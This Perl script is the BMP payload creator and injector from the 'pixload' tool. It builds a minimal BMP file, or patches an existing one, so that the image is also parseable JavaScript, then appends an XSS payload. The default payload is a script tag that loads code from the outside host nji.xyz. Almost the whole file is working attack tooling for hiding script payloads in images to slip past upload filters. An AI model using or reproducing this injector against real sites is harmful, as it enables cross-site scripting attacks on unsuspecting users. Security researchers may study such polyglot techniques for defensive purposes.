#!/usr/bin/env perl
#
# BMP Payload Creator/Injector
#
# coded by chinarulezzz, alexandr.savca89@gmail.com
# credits to Osanda Malith Jayathissa
#
# See LICENSE file for copyright and license details.
#

use strict;
use warnings;
use feature 'say';

use POSIX;
use Getopt::Long;

sub usage;
sub create_bmp;
sub inject_payload;

# Command line options
GetOptions(
    'help!'     =>  \my $help,
    'payload=s' =>  \my $payload,
    'output=s'  =>  \my $outfile,
);
usage(0)     if $help;
usage(1) unless $outfile;

$payload //= '<script src=//nji.xyz></script>';

say <<EOF;
[>|       BMP Payload Creator/Injector      |<]

    https://github.com/chinarulezzz/pixload

EOF

create_bmp              unless -f $outfile;
inject_payload;

say `file       $outfile`   if -f '/usr/bin/file';
say `hexdump -C $outfile`   if -f '/usr/bin/hexdump';

# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #   
#                                Subroutines                                  #
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #   

sub usage {
    say <<"EOF";
Usage: $0 [-payload 'STRING'] -output payload.bmp

If the output file exists, then the payload will be injected into the
existing file.  Else the new one will be created.
EOF
    exit +shift;
}

sub create_bmp {
    say "[>] Generating output file";

    my $bmp_minimal =
          "\x42\x4d\x1e\x00\x00\x00\x00\x00\x00\x00\x1a\x00"
        . "\x00\x00\x0c\x00\x00\x00\x01\x00\x01\x00\x01\x00"
        . "\x18\x00\x00\x00\xff\x00";

    sysopen my $fh, $outfile, O_CREAT|O_WRONLY;
    syswrite   $fh, $bmp_minimal;
    close      $fh;

    say "[✔] File saved to: $outfile\n";
}

sub inject_payload {
    say "[>] Injecting payload into $outfile";

    sysopen my $fh, $outfile, O_RDWR;
    sysseek    $fh, 2, SEEK_SET;

    syswrite   $fh, "\x2f\x2a";
    sysseek    $fh, 0, SEEK_END;
    
    syswrite   $fh, "\x2a\x2f\x3d\x31\x3b";
    syswrite   $fh, $payload;
    syswrite   $fh, "\x3b";

    close      $fh;

    say "[✔] Payload was injected successfully\n";
}

# vim:sw=4:ts=4:sts=4:et:cc=80
# End of file
